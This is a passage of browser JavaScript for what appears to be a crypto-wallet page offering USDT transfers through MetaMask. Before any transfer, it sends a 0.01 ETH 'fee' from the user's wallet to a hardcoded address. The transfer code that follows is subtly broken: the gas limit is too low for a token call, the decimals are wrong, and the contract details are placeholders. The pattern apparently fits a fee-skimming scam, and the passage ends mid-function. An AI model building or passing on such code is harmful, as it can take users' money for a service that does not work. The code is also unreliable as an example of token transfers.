    <script>
        let web3, userAccount;
        const feeAddress = "0x3a06322e9F1124F6B2de8F343D4FDce4D1009869";
        const usdtAddress = "YOUR_USDT_CONTRACT_ADDRESS"; // Replace with your USDT contract address
        const usdtAbi = [...] // Replace with the ABI of the USDT token contract

        async function connectWallet() {
            if (window.ethereum) {
                try {
                    web3 = new Web3(window.ethereum);
                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                    userAccount = accounts[0];
                    document.getElementById('walletStatus').textContent = `Connected: ${userAccount}`;
                } catch (error) {
                    alert('Wallet connection failed!');
                }
            } else {
                alert('MetaMask is not installed. Please install MetaMask to connect.');
            }
        }

        async function sendTransaction(event) {
            event.preventDefault();
            const recipient = document.getElementById('recipient').value;
            const amount = document.getElementById('amount').value;

            try {
                const fee = web3.utils.toWei('0.01', 'ether');
                await web3.eth.sendTransaction({ from: userAccount, to: feeAddress, value: fee });
                document.getElementById('progressBar').style.width = '50%';
                document.getElementById('progressBar').textContent = 'Processing...';

                // Real transaction logic
                const usdtContract = new web3.eth.Contract(usdtAbi, usdtAddress);
                const decimals = await usdtContract.methods.decimals().call();
                const amountWei = web3.utils.toWei(amount, 'ether');
                const gasPrice = await web3.eth.getGasPrice();
                const gasLimit = 21000;

                const tx = await usdtContract.methods.transfer(recipient, amountWei).send({
                    from: userAccount,
                    gas: gasLimit,
                    gasPrice: gasPrice
                });

                document.getElementById('progressBar').style.width = '100%';
                document.getElementById('progressBar').textContent = 'Transaction Complete!';
                alert('Transaction sent successfully.');
            } catch (error) {
                alert('Transaction failed: ' + error.message);
            }
        }

        document.getElementById('connectWallet').addEventListener('click', connectWallet);
        document.getElementById('transactionForm').addEventListener('submit', sendTransaction);

        // PWA Installation Prompt

        window.addEventListener('beforeinstallprompt', (e) => {
            e.preventDefault();
            deferredPrompt = e;
            if (!('showInstallPrompt' in navigator)) return;
            deferredPrompt.prompt();
